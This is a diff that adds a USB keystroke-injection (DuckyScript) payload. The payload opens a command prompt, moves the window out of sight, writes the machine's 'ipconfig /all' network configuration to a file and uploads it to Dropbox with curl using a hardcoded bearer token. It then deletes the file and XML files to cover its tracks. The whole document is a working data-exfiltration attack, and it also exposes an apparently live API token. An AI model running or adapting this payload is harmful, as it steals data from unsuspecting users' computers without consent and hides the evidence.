@@ -1,0 +1,37 @@
+REM Configurations Payload
+REM By Joe Brasher
+DELAY 800
+REM Go into run
+GUI r
+DELAY 300
+REM Go to Command Line
+STRING cmd /k
+ENTER
+DELAY 300
+ALT SPACE
+DOWNARROW
+REM Create Folder to Store Passwords
+ENTER 
+STRING mkdir temp
+ENTER 
+DELAY 300
+STRING cd temp
+ENTER 
+DELAY 300
+REM Get the Systems Info
+ENTER 
+DELAY 300
+STRING ipconfig /all > config.txt
+ENTER 
+DELAY 300
+REM Connect to Dropbox API
+STRING curl -X POST https://content.dropboxapi.com/2/files/upload 
+STRING --header "Authorization: Bearer sl.BTO4gklLFZUewi13l7Bh2teyzEBcQByr_JNpsKgJ4ryrxNuI-mVivLuaVJcETrYjfipmCQ7fB7TowvKv7tGOtrNsIlDZCMkmQHiQheh4Q4vJGXO96LDw08IsMcs_Bh9YIfr3gdc" 
+STRING --header "Dropbox-API-Arg: {\"autorename\":true,\"mode\":\"add\",\"mute\":false,\"path\":\"/temp/config.txt\"}" 
+STRING --header "Content-Type: application/octet-stream" 
+STRING --data-binary @config.txt"
+ENTER
+DELAY 700
+STRING del config.txt *.xml
+ENTER
+ALT F4
